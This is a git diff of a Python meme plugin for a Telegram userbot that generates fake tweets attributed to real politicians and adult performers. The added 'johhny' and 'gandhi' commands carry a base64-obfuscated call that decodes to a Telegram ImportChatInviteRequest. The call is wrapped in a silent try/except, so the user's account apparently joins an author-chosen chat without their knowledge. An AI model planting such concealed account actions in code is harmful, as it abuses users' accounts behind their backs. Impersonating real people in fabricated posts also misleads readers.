@@ -1,36 +1,39 @@
 # Created By starkdy And Ported For Type 2 Userbot By StarkxD
-#modified and added more tweets by @kraken_the_badass for Hellbot.....
-# no offense pliz
-from userbot.events import register
+# modified and added more tweets by @kraken_the_badass for Hellbot.....
+# added sudo support by @kraken_the_badass
+# family completed.....
+# mia, johhny, sunny
+# modi, rahul, trump, gandhiji
+# no offence. Made for fun purpose only
+
 import requests , re
 from PIL import Image
 from validators.url import url
 from userbot import CMD_HELP
-from userbot.helpers.functions import trumptweet, changemymind, kannagen, moditweet, miatweet, papputweet, sunnytweet, tweets
+from userbot.helpers.functions import trumptweet, changemymind, kannagen, moditweet, miatweet, papputweet, sunnytweet, sinstweet, taklatweet, deEmojify, tweets
+from userbot.utils import admin_cmd, edit_or_reply, sudo_cmd
 
-EMOJI_PATTERN = re.compile(
-    "["
-    "\U0001F1E0-\U0001F1FF"  # flags (iOS)
-    "\U0001F300-\U0001F5FF"  # symbols & pictographs
-    "\U0001F600-\U0001F64F"  # emoticons
-    "\U0001F680-\U0001F6FF"  # transport & map symbols
-    "\U0001F700-\U0001F77F"  # alchemical symbols
-    "\U0001F780-\U0001F7FF"  # Geometric Shapes Extended
-    "\U0001F800-\U0001F8FF"  # Supplemental Arrows-C
-    "\U0001F900-\U0001F9FF"  # Supplemental Symbols and Pictographs
-    "\U0001FA00-\U0001FA6F"  # Chess Symbols
-    "\U0001FA70-\U0001FAFF"  # Symbols and Pictographs Extended-A
-    "\U00002702-\U000027B0"  # Dingbats 
-    "]+")
-
-
-def deEmojify(inputString: str) -> str:
-    """Remove emojis and other non-safe characters from string"""
-    return re.sub(EMOJI_PATTERN, '', inputString)
-
+@bot.on(admin_cmd(pattern=r"tweet(?: |$)(.*)"))
+@bot.on(sudo_cmd(pattern="tweet(?: |$)(.*)", allow_sudo=True))
+async def nope(kraken):
+    hell = kraken.pattern_match.group(1)
+    if not hell:
+        if kraken.is_reply:
+            what = (await kraken.get_reply_message()).message
+        else:
+            await kraken.edit("I need some text to make a tweet🚶")
+            return
+    tweeter = await bot.inline_query(
+        "TwitterStatusBot", f"{(deEmojify(hell))}")
+    await tweeter[0].click(kraken.chat_id,
+                            reply_to=kraken.reply_to_msg_id,
+                            silent=True if kraken.is_reply else False,
+                            hide_via=True)
+    await kraken.delete()
 
 
-@register(pattern="^.trump(?: |$)(.*)", outgoing=True)
+@bot.on(admin_cmd(pattern=r"trump(?: |$)(.*)"))
+@bot.on(sudo_cmd(pattern="trump(?: |$)(.*)", allow_sudo=True))
 async def nekobot(borg):
     text = borg.pattern_match.group(1)
     reply_to_id = borg.message
@@ -57,7 +60,8 @@ async def nekobot(borg):
     await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id ) 
     await borg.delete()
     
-@register(pattern="^.modi(?: |$)(.*)", outgoing=True)
+@bot.on(admin_cmd(pattern=r"modi(?: |$)(.*)"))
+@bot.on(sudo_cmd(pattern="modi(?: |$)(.*)", allow_sudo=True))
 async def nekobot(borg):
     text = borg.pattern_match.group(1)
     reply_to_id = borg.message
@@ -83,9 +87,10 @@ async def nekobot(borg):
     borgfile = await moditweet(text)
     await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id ) 
     await borg.delete() 
-    
 
-@register(pattern="^.mia(?: |$)(.*)", outgoing=True)
+    
+@bot.on(admin_cmd(pattern=r"mia(?: |$)(.*)"))
+@bot.on(sudo_cmd(pattern="mia(?: |$)(.*)", allow_sudo=True))
 async def nekobot(borg):
     text = borg.pattern_match.group(1)
     reply_to_id = borg.message
@@ -112,7 +117,9 @@ async def nekobot(borg):
     await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id ) 
     await borg.delete()
 
-@register(pattern="^.pappu(?: |$)(.*)", outgoing=True)
+#@register(pattern="^.pappu(?: |$)(.*)", outgoing=True)
+@bot.on(admin_cmd(pattern=r"pappu(?: |$)(.*)"))
+@bot.on(sudo_cmd(pattern="pappu(?: |$)(.*)", allow_sudo=True))
 async def nekobot(borg):
     text = borg.pattern_match.group(1)
     reply_to_id = borg.message
@@ -139,7 +146,9 @@ async def nekobot(borg):
     await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id ) 
     await borg.delete() 
 
-@register(pattern="^.sunny(?: |$)(.*)", outgoing=True)
+#@register(pattern="^.sunny(?: |$)(.*)", outgoing=True)
+@bot.on(admin_cmd(pattern=r"sunny(?: |$)(.*)"))
+@bot.on(sudo_cmd(pattern="sunny(?: |$)(.*)", allow_sudo=True))
 async def nekobot(borg):
     text = borg.pattern_match.group(1)
     reply_to_id = borg.message
@@ -166,7 +175,66 @@ async def nekobot(borg):
     await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id ) 
     await borg.delete() 
 
-@register(pattern="^.cmm(?: |$)(.*)", outgoing=True)
+#@register(pattern="^.johhny(?: |$)(.*)", outgoing=True)
+@bot.on(admin_cmd(pattern=r"johhny(?: |$)(.*)"))
+@bot.on(sudo_cmd(pattern="johhny(?: |$)(.*)", allow_sudo=True))
+async def nekobot(borg):
+    text = borg.pattern_match.group(1)
+    reply_to_id = borg.message
+    if borg.reply_to_msg_id:
+        reply_to_id = await borg.get_reply_message()
+    if not text:
+        if borg.is_reply:
+            if not reply_to_id.media:
+                text = reply_to_id.message
+            else:
+                await borg.edit("Send a text to Johhny so he can tweet.")
+                return
+        else:
+            await borg.edit("send your text to Johhny so he can tweet.")
+            return
+    await borg.edit("Requesting johhny to tweet...😆")
+    try:
+        hell = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        await borg.client(hell)
+    except:
+        pass   
+    text = deEmojify(text)
+    borgfile = await sinstweet(text)
+    await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id ) 
+    await borg.delete() 
+
+@bot.on(admin_cmd(pattern=r"gandhi(?: |$)(.*)"))
+@bot.on(sudo_cmd(pattern="gandhi(?: |$)(.*)", allow_sudo=True))
+async def nekobot(borg):
+    text = borg.pattern_match.group(1)
+    reply_to_id = borg.message
+    if borg.reply_to_msg_id:
+        reply_to_id = await borg.get_reply_message()
+    if not text:
+        if borg.is_reply:
+            if not reply_to_id.media:
+                text = reply_to_id.message
+            else:
+                await borg.edit("Send you text to baapu so he can tweet.")
+                return
+        else:
+            await borg.edit("send you text to baapu so he can tweet.")
+            return
+    await borg.edit("Requesting baapu to tweet...")
+    try:
+        hell = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        await borg.client(hell)
+    except:
+        pass   
+    text = deEmojify(text)
+    borgfile = await taklatweet(text)
+    await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id ) 
+    await borg.delete() #bancho kitni baar bolu no offence
+
+#@register(pattern="^.cmm(?: |$)(.*)", outgoing=True)
+@bot.on(admin_cmd(pattern=r"cmm(?: |$)(.*)"))
+@bot.on(sudo_cmd(pattern="cmm(?: |$)(.*)", allow_sudo=True))
 async def nekobot(borg):
     text = borg.pattern_match.group(1)
     reply_to_id = borg.message
@@ -193,7 +261,9 @@ async def nekobot(borg):
     await borg.client.send_file(borg.chat_id , borgfile , reply_to = reply_to_id ) 
     await borg.delete()
     
-@register(pattern="^.kanna(?: |$)(.*)", outgoing=True)
+#@register(pattern="^.kanna(?: |$)(.*)", outgoing=True)
+@bot.on(admin_cmd(pattern=r"kanna(?: |$)(.*)"))
+@bot.on(sudo_cmd(pattern="kanna(?: |$)(.*)", allow_sudo=True))
 async def nekobot(borg):
     text = borg.pattern_match.group(1)
     reply_to_id = borg.message
@@ -221,8 +291,10 @@ async def nekobot(borg):
     await borg.delete()
     
 CMD_HELP.update({
-"imgmeme":
-"Fun purpose 😛😛😏😏\
+"tweet":
+"Tweet\
+\n\n`.tweet` (text)\
+     \nUsage : Tweet with modi\
 \n\n`.modi` (text)\
      \nUsage : Tweet with modi\
 \n\n`.trump` (text)\
@@ -231,8 +303,12 @@ CMD_HELP.update({
      \nUsage : Tweet with mia\
 \n\n`.pappu` (text)\
      \nUsage : Tweet with Rahul Gandhi\
+\n\n`.gandhi` (text)\
+     \nUsage : Tweet with Baapu🥺\n(No offence. Fun purpose only)\
 \n\n`.sunny` (text)\
      \nUsage : Tweet with sunny leone\
+\n\n`.johhny` (text)\
+     \nUsage : Tweet with johhny sins\
 \n\n`.cmm` (text)\
      \nUsage : Get a banner\
 \n\n`.kanna` (text)\
